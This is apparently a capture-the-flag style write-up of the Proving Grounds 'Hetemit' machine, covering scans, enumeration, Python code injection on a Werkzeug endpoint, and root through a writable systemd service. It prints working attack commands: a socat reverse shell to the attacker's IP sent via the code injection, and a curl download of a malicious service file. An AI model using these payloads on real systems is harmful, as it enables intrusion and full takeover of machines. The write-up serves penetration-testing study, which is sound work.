---
layout: post
title: PG | Hetemit
subtitle: Hetemit - The Goddess of Destruction
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-30 06:11 EDT
Nmap scan report for 192.168.235.117
Host is up (0.015s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
|_http-server-header: Apache/2.4.37 (centos)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
18000/tcp open  biimenu?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 297.05 seconds
~~~

## FTP (TCP/21)

After connecting anonymously I was unable to view any files on the FTP server

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hetemit]
└─$ ftp anonymous@192.168.235.117
Connected to 192.168.235.117.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
~~~

## HTTP (TCP/80)

The web server on port 80 is displaying an Apache HTTP Test Page and after enumerating the website I could not find information or vulnerabilities that could lead me to a foothold

![Hetemit](/assets/img/HetemitPG(1).png)

## SMB (139, 445)

The SMB server revealed a restricted share named 'Cmeeks' which looks like a username for an account on the target

![Hetemit](/assets/img/HetemitPG(2).png)

## HTTP (TCP/18000)

The web server on port 18000 is hosting a web app behind a log in page, after trying default credentials and attempting to register an account there was no success in navigating deeper into the website as the registration proccess required an invite code as shown below

![Hetemit](/assets/img/HetemitPG(3).png)

## HTTP (TCP/50000)

The web server on port 50000 is running Werkzeug httpd 1.0.1 (Python 3.6.8) which is an interface to integrate python code into a web application.

The initial webpage displays two sub-directories/pages /generate and /verify which seems like a back-end system for code generation for the Registration system on port 18000.

![Hetemit](/assets/img/HetemitPG(4).png)

The /verify page displays a {code} variable, using a curl POST request I was able to inject data into the code variable which was executed by the web server

![Hetemit](/assets/img/HetemitPG(5).png)

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hetemit]
└─$ curl -X POST http://192.168.235.117:50000/verify --data "code=1*5"
5  
~~~

As the web server is running Python I created a python-based reverse shell using the Python utility os.system() to execute shell commands

Start Listener

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hetemit]
└─$ nc -nvlp 21
listening on [any] 21 ...
~~~

Execute python reverse shell

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hetemit]
└─$ curl -X POST http://192.168.235.117:50000/verify --data "code=os.system('socat TCP:192.168.45.167:21 EXEC:sh')"
~~~

And I recieved my initial foothold as the user 'cmeeks' we found earlier via SMB!

~~~shell
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.235.117] 55190
whoami
cmeeks
~~~

# Privilege Escalation

I began enumerating for Privilege Escalation by running linpeas and identified a service pythonapp.service our user has write permissions over

![Hetemit](/assets/img/HetemitPG(6).png)

The pythonapp.service as shown below is executing restjson_hetemit in the context of the User cmeeks and is executed via 'Restart=on-faliure' so requires a device reboot to execute

![Hetemit](/assets/img/HetemitPG(7).png)

I created a malicious version of pythonapp.service on my attack machine with the assistance of [this](https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation) reverse shell service payload for Privilege Escalation, the malicious service runs the service in the context of the 'root' user and executes a reverse shell

![Hetemit](/assets/img/HetemitPG(8).png)

I transferred and replaced the current pythonapp.service on the target machine with the malicious pythonapp.service

~~~shell
sh-4.4$ curl http://192.168.45.167/pythonapp.service -o pythonapp.service
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   200  100   200    0     0   5882      0 --:--:-- --:--:-- --:--:--  5882
~~~

I needed to find a way to restart the system to execute the service, and after checking our current users sudo permissions I found it had sudo permissions over /sbin/reboot

![Hetemit](/assets/img/HetemitPG(9).png)

I started my netcat listener for the reverse shell on port 18000

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hetemit]
└─$ nc -nvlp 18000
listening on [any] 18000 ...
~~~

I then rebooted the system

~~~shell
sh-4.4$ sudo /sbin/reboot
~~~

After a few seconds I recieved my reverse shell as root!

~~~shell
┌──(kali㉿kali)-[~/Desktop/Hetemit]
└─$ nc -nvlp 18000
listening on [any] 18000 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.235.117] 40820
bash: cannot set terminal process group (1213): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit /]# whoami
whoami
root
~~~